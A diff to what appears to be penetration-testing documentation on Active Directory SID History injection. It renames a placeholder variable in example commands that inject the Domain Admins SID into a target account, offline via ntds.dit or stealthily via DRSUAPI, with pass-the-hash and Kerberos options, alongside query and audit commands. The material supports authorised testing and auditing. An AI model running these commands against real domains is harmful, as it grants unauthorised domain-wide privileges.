@@ -93,15 +93,15 @@ Stops NTDS, modifies `ntds.dit` offline via DSInternals, restarts NTDS. Works sa
 ```bash
 # Same-domain: inject Domain Admins SID
 python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
-    --target $TARGET --inject domain-admins --force
+    --target $TARGET_USER --inject domain-admins --force
 
 # Cross-domain: inject DA from a foreign domain
 python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
-    --target $TARGET --inject domain-admins --inject-domain $FOREIGN_DOMAIN --force
+    --target $TARGET_USER --inject domain-admins --inject-domain $FOREIGN_DOMAIN --force
 
 # Raw SID injection
 python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
-    --target $TARGET --inject $SID --force
+    --target $TARGET_USER --inject $SID --force
 ```
 
 #### DRSUAPI method (cross-forest, stealth)
@@ -110,7 +110,7 @@ Calls `DRSAddSidHistory` (opnum 20) over RPC. No disk writes, no service, no NTD
 
 ```bash
 python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
-    --target $TARGET --method drsuapi \
+    --target $TARGET_USER --method drsuapi \
     --source-user $SRC_USER --source-domain $SRC_DOMAIN \
     --src-username $SRC_USER --src-password $SRC_PASSWORD --src-domain $SRC_DOMAIN
 ```
@@ -120,11 +120,11 @@ Pass-the-Hash and Kerberos authentication are also supported:
 ```bash
 # Pass-the-Hash authentication
 python3 main.py -d $DOMAIN -u $USER --ntlm-hash $NT_HASH --dc-ip $DC_IP \
-    --target $TARGET --inject domain-admins --force
+    --target $TARGET_USER --inject domain-admins --force
 
 # Kerberos authentication
 python3 main.py -d $DOMAIN -u $USER --kerberos --ccache $CCACHE --dc-ip $DC_IP \
-    --target $TARGET --inject domain-admins --force
+    --target $TARGET_USER --inject domain-admins --force
 ```
 
 :::
@@ -147,7 +147,7 @@ Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory -ne $
 
 ```bash
 # Query sIDHistory of a specific user
-python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --query $TARGET
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --query $TARGET_USER
 
 # Domain-wide audit with risk assessment
 python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --audit
